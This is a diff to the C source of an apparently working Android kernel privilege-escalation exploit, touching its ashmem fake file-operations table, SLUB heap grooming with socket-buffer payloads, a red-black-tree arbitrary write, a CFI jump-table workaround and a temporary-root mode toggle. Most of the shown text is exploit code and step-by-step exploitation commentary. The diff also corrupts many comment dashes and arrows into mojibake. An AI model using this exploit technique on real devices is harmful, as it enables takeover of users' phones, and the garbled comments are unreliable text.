@@ -1,4 +1,4 @@
-#include "common.h"
+﻿#include "common.h"
 #include "kernelsnitch/kernelsnitch.h"
 
 FILE *g_logfile = NULL;
@@ -334,6 +334,15 @@ int open_ashmem_device(void) {
   return SYSCHK(open(ashmem_path, O_RDWR | O_CLOEXEC));
 }
 
+int cve_temp_root_mode(void) {
+  static int mode = -1;
+  if (mode < 0) {
+    const char *env = getenv("CVE43499_TEMP_ROOT");
+    mode = (env && *env == '1') ? 1 : 0;
+  }
+  return mode;
+}
+
 uintptr_t p0_data_alias(uintptr_t image_addr) {
   uintptr_t off = image_addr - KIMAGE_TEXT_BASE;
   uintptr_t phys = P0_KERNEL_PHYS_LOAD + off;
@@ -377,7 +386,7 @@ void put32(unsigned char *p, size_t off, uint32_t value) {
 
 void put_fake_fops_table(unsigned char *p, size_t off) {
   /* CONFIG_CFI_CLANG: every function pointer in the table MUST be the
-   * canonical .cfi_jt jump-table entry — raw kallsyms addresses make the
+   * canonical .cfi_jt jump-table entry â€” raw kallsyms addresses make the
    * first indirect call (misc_open -> f_op->open) panic with
    * "CFI failure" (observed on the live target).  Layout mimics the real
    * ashmem_fops: owner NULL, .splice_read NULL, real ashmem_llseek.
@@ -539,7 +548,7 @@ int clone_memfd(void) {
  * test VM (root): a kprobe event fetches arbitrary kernel memory into the
  * trace buffer (offsets from _text are parsed with kstrtol, so direct-map
  * targets are reachable).  Everywhere else the verify is skipped and the
- * flow proceeds unverified — the upstream device behaviour, relying on
+ * flow proceeds unverified â€” the upstream device behaviour, relying on
  * reclaim determinism and the downstream cfi-stage checks.
  */
 
@@ -935,7 +944,7 @@ static void pre_leak_slab_flush(void) {
    * leaked mm_struct.  This way the leaked slab becomes fully empty
    * the instant memfd_leak closes; discard_slab fires on the same
    * put_cpu_partial -> unfreeze_partials path without an extra
-   * scheduling round-trip.  No usleep/yield here — we want zero gap
+   * scheduling round-trip.  No usleep/yield here â€” we want zero gap
    * between the close and the first skb-send that reclaims the page. */
   flush_mm_cpu_partial();
   release_prepare_drain_markers();
@@ -992,7 +1001,7 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
      * comes from the stamped stale waiter's OWN tree_entry during the
      * chain walk's rt_mutex_dequeue(lock, waiter) (rtmutex.c step [7]):
      * rb_erase_cached sees pc=fake_fops(RED), rb_right=0, rb_left=target
-     * → rb_set_parent(child=target, parent=fake_fops) writes
+     * â†’ rb_set_parent(child=target, parent=fake_fops) writes
      * *target = fake_fops.  Collateral: __rb_change_child stores `target`
      * into fake_fops+0x08 (the "parent's" rb_right = fops .llseek slot),
      * repaired later by repair_fake_fops_llseek().  Hence the page only
@@ -1001,7 +1010,7 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
     for (size_t chunk = 0; chunk < SKB_SEND_SIZE; chunk += ORDER3_SIZE) {
       unsigned char *p = skb_buf + chunk + SKB_FRAG_BIAS;
 
-      /* fake_lock: all zero — wait_lock free, no owner, empty tree
+      /* fake_lock: all zero â€” wait_lock free, no owner, empty tree
        * (memset above already zeroed it). */
 
       /* fake_task: detached (pi_waiters empty), sane prio/usage so the
@@ -1050,7 +1059,7 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
 #endif
 
   /* FOPS mode: one-child rb_erase at pi_tree_entry writes fake_fops to
-   * ASHMEM_MISC_FOPS:  parent = ASHMEM_MISC_FOPS-8 → __rb_change_child()
+   * ASHMEM_MISC_FOPS:  parent = ASHMEM_MISC_FOPS-8 â†’ __rb_change_child()
    * stores the child (fake_fops) into parent->rb_right (= target).
    * color MUST be RED (0): a BLACK erased node would make __rb_erase_color
    * walk ashmem_misc/fake_fops as rb nodes (rotate/recolor garbage).
@@ -1059,14 +1068,14 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
    *  - rb_left=fake_fops / rb_right=0: rb_erase takes the one-child path
    *    with child=fake_fops (the write value).  rb_next(fake_w0) then has
    *    rb_right==0 and walks UP to parent=ASHMEM_MISC_FOPS-8, returning it
-   *    as the new cached leftmost — it never descends into the fops table.
+   *    as the new cached leftmost â€” it never descends into the fops table.
    *  - fake_task->pi_waiters.rb_node stays NULL (detached root, see below),
    *    so the post-write rt_mutex_enqueue_pi(stale) inserts into an EMPTY
-   *    tree: parent==NULL → node colored BLACK → break.  Zero fixup
-   *    iterations, zero recolors/rotations touching the fops table —
+   *    tree: parent==NULL â†’ node colored BLACK â†’ break.  Zero fixup
+   *    iterations, zero recolors/rotations touching the fops table â€”
    *    .owner survives as fake_w0|1 and try_module_get() at open() passes
    *    (a fixup recolor to (fake_w0+0x18)|1 made module->state read the
-   *    pi_tree_entry self-pointer → ENODEV, observed on the live target). */
+   *    pi_tree_entry self-pointer â†’ ENODEV, observed on the live target). */
   uintptr_t write_pc = (data_addr(ASHMEM_MISC_FOPS) - 8); /* color=RED */
   uintptr_t write_right = 0;
   uintptr_t write_left = fake_fops;
@@ -1128,11 +1137,11 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
        * points at the fake waiter.  rb_erase_cached() still runs rb_next +
        * rb_erase on it (node links are self-contained: parent = ASHMEM_MISC
        * _FOPS-8, rb_left = fake_fops), so the rb_write lands, but the tree
-       * itself stays EMPTY — the post-write rt_mutex_enqueue_pi() then
+       * itself stays EMPTY â€” the post-write rt_mutex_enqueue_pi() then
        * inserts the stale waiter as root with parent==NULL, i.e. ZERO
        * rb_insert_color fixup iterations that would otherwise recolor/
        * rotate the fake fops table (its .owner got clobbered to
-       * (fake_w0+0x18)|1 → try_module_get failure → ENODEV at open). */
+       * (fake_w0+0x18)|1 â†’ try_module_get failure â†’ ENODEV at open). */
       put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF, 0);
       put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08,
             fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
@@ -1213,7 +1222,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   }
   /* Kill the prepare children early too: their mm_structs must be
    * pinned solely by the memfds (refcount 1) so that closing a
-   * prepare memfd below actually frees the mm_struct — the v5.10
+   * prepare memfd below actually frees the mm_struct â€” the v5.10
    * cpu_partial drain before close(memfd_leak) depends on it. */
   for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
     kill_child(prepare_ctx.childs[i]);
@@ -1357,7 +1366,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
    * partial list and discards it.  Draining BEFORE the close (the
    * earlier reorder) unfreezes the slab while it still holds its one
    * live object, so the slab is parked on the node partial list and the
-   * final free never discards — the page never reaches buddy
+   * final free never discards â€” the page never reaches buddy
    * (GDB-verified on b0q: zero discard_slab hits).
    * ---------------------------------------------------------------- */
   if (!oppo_teardown)
@@ -1385,7 +1394,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
 
   /* Step 1: close the leaked mm_struct.  The pre/post closes above left
    * the leak slab FROZEN on this CPU's SLUB cpu_partial list with
-   * inuse=1, so this last free takes the FREE_FROZEN path — the slab
+   * inuse=1, so this last free takes the FREE_FROZEN path â€” the slab
    * drops to inuse=0 but is NOT discarded (v5.10 never discards a
    * frozen slab from __slab_free). */
   SYSCHK(close(memfd_leak));
@@ -1409,11 +1418,11 @@ uintptr_t prepare_kernel_page(int payload_mode) {
    * unfreeze_partials AFTER the leak slab is empty.  The frozen+empty
    * leak slab then moves to the NODE partial list where
    * discard_slab() fires (inuse==0 && nr_partial >= min_partial(5))
-   * and its order-3 page lands on buddy free_area[3] — exactly the
+   * and its order-3 page lands on buddy free_area[3] â€” exactly the
    * upstream (S25U) ordering; the earlier drain-first reorder left the
    * leak slab stranded frozen+empty (GDB-verified: zero discard_slab
    * hits, page never reaches buddy).
-   * No mm_struct allocation may happen between step 1 and the sends —
+   * No mm_struct allocation may happen between step 1 and the sends â€”
    * a fresh mm alloc could reactivate the leak slab as cpu_slab. */
   if (!oppo_teardown) {
     for (size_t i = 0; i < prepare_ctx.mm_cnt; i += mm_objs_per_slab) {
@@ -1434,11 +1443,11 @@ uintptr_t prepare_kernel_page(int payload_mode) {
 
   /* Hold-all (default, IonStackQuest3 semantics): every reclaim skb stays
    * QUEUED on its pair through the cfi/pipe stages, so every order-3 page
-   * the sends captured — the leak page among them — keeps its payload until
+   * the sends captured â€” the leak page among them â€” keeps its payload until
    * close_reclaim_sockets() at the next prepare.  The old drain-cycling
    * (SKB_DRAIN_SENDS=1) freed each skb right after receipt and pinned only
    * one final head page; with b0q's tail-insert/shuffle buddy frees the
-   * leak page usually sat mid-list and was never captured — the payload
+   * leak page usually sat mid-list and was never captured â€” the payload
    * never landed, the page was recycled as live mm_structs by the exp64
    * child's own fork/exec churn, and the stale misc.fops then crashed
    * misc_open (GDB-verified 2026-08-07: 10/10 attempts missed, die at
@@ -1486,7 +1495,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     }
   } else {
     /* Hold-all: queue each skb undrained.  Round-robin over the pairs;
-     * a full pair reports EAGAIN (MSG_DONTWAIT) — the pairs fill evenly,
+     * a full pair reports EAGAIN (MSG_DONTWAIT) â€” the pairs fill evenly,
      * so the first failure means every pair is at capacity. */
     for (int i = 0; i < reclaim_want; i++) {
       int pair = i % SKB_RECLAIM_PAIRS;
@@ -1502,7 +1511,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   /* Stability hold (drain-cycling mode only): leave one payload skb queued
    * (undrained) so the reclaimed page_base stays allocated through the
    * pselect/cfi/pipe stages.  Without this the page floats in the buddy
-   * allocator and the pipe prepare child's sprays reclaim it — clobbering
+   * allocator and the pipe prepare child's sprays reclaim it â€” clobbering
    * the fake fops table (arb-r/w then reads 0, or CFI panics on close).
    * The send re-sprays the same payload, so page_base keeps valid contents.
    * Hold-all mode needs no separate hold: every queued skb is a hold. */
@@ -1652,3 +1661,4 @@ ssize_t kernel_write_data(int fd, uintptr_t target, const void *data, size_t len
 ssize_t kernel_read_data(int fd, uintptr_t target, void *data, size_t len) {
   return configfs_read_once(fd, target, data, len);
 }
+
